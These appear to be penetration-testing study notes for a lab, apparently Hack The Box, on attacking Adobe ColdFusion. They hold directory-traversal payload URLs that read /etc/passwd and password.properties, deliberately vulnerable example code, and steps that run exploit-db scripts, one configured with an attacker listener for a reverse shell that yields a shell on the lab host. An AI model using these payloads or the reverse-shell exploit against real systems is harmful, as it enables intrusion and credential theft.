# Attacking ColdFusion

searchsploit adobe coldfusion

## Directory Traversal

Example of vulnerable code :
<cfdirectory directory="#ExpandPath('uploads/')#" name="fileList">
<cfloop query="fileList">
    <a href="uploads/#fileList.name#">#fileList.name#</a><br>
</cfloop>

http://example.com/index.cfm?directory=../../../etc/&file=passwd

CVE-2010-2861 is the Adobe ColdFusion - Directory Traversal exploit discovered by searchsploit. It is a vulnerability in ColdFusion that allows attackers to conduct path traversal attacks.

CFIDE/administrator/settings/mappings.cfm
logging/settings.cfm
datasources/index.cfm
j2eepackaging/editarchive.cfm
CFIDE/administrator/enter.cfm

http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=en
http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../etc/passwd

searchsploit -p 14641
cp /usr/share/exploitdb/exploits/multiple/remote/14641.py .
python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"

## Unauthenticated RCE

--> execute arbitrary code on a vulnerable system without requiring authentication

Example of vulnerable code :
<cfset cmd = "#cgi.query_string#">
<cfexecute name="cmd.exe" arguments="/c #cmd#" timeout="5">

http://www.example.com/index.cfm?%3B%20echo%20%22This%20server%20has%20been%20compromised%21%22%20%3E%20C%3A%5Ccompromise.txt

http://www.example.com/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=

--> CVE-2009-2265

searchsploit -p 50057
cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
vi 50057.py
if __name__ == '__main__':
    # Define some information
    lhost = '10.10.14.55' # HTB VPN IP
    lport = 4444 # A port not in use on localhost
    rhost = "10.129.247.30" # Target IP
    rport = 8500 # Target Port
    filename = uuid.uuid4().hex

python3 50057.py

## LAB



searchsploit -p 50057
cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
vi 50057.py
if __name__ == '__main__':
    # Define some information
    lhost = '10.10.14.205' # HTB VPN IP
    lport = 4444 # A port not in use on localhost
    rhost = "10.129.200.101" # Target IP
    rport = 8500 # Target Port
    filename = uuid.uuid4().hex

python3 50057.py

C:\ColdFusion8\runtime\bin>whoami
whoami
arctic\tolis
